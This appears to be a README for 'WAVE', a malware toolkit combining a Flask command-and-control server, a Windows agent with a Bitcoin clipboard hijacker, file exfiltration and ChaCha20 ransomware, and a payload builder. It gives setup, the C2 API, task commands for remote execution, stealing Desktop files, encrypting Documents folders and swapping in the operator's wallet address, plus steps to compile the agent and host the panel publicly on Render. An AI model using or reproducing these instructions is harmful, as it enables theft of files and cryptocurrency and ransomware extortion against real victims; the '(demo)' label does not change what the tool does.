WAVE – web C2, clipjacker, file exfil, ChaCha20 ransomware (demo)

Components
- app.py: Flask control panel (admin UI + REST C2 API)
- payload_win.py: Windows agent with clipboard hijacker and ransomware
- builder.py: emits a configured agent and PowerShell loader
- templates/: UI (Bootstrap dark theme)
- loot/: exfiltrated files are saved here by agent id

Run locally
1) python3 -m venv venv && . venv/bin/activate
2) pip install -r requirements.txt
3) export ADMIN_PASS=changeme
4) python app.py
5) Visit http://127.0.0.1:5000/admin?p=changeme

API basics
- POST /api/register -> {id, settings}
- POST /api/poll {id} -> queued tasks
- POST /api/result {task_id,status,result(base64)}
- POST /api/upload?id=<agent>&path=<path> multipart form with file

Queue tasks from Admin or POST to /admin/queue/<agent> with fields
- type=exec args={"cmd":"whoami"}
- type=exfil args={"path":"C:\\Users\\User\\Desktop\\file.txt"}
- type=ransom args={"dirs":["C:\\Users\\User\\Documents"],"ext":".wave"}
- type=clipjacker args={"enable":true,"btc":"<your btc>"}

Build Windows payload
- python builder.py http://YOUR-RENDER-APP.onrender.com
- Then compile with PyInstaller on Windows: pyinstaller --onefile payload_win_configured.py

Render deployment
- requirements.txt with Flask and gunicorn are provided
- Procfile: web: gunicorn app:app
- Set env vars: ADMIN_PASS, SECRET_KEY
- Expose PORT env (Render sets it at runtime); gunicorn will read app:app via Procfile
